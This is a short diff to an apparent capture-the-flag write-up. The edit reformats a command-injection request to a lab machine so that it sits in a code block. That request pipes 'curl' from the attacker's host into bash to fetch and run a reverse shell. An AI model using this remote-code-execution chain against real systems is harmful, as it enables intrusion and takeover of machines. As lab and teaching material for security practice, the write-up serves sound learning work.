@@ -55,7 +55,10 @@ Now I start a http server with python3 (*python3 -m http.server 80*)
 
 And if you send a curl to your ip and add a pipe and "bash", it executes the index.html with bash, and the content of the file is a reverse shell.
 
-So send a request to: http://10.10.10.61/?p=404.php&cmd=curl 10.10.16.6 \| bash
+So send a request to: 
+```
+http://10.10.10.61/?p=404.php&cmd=curl 10.10.16.6 | bash
+```
 
 (You need to change the ip of the curl and the ip of the reverse shell.)
 
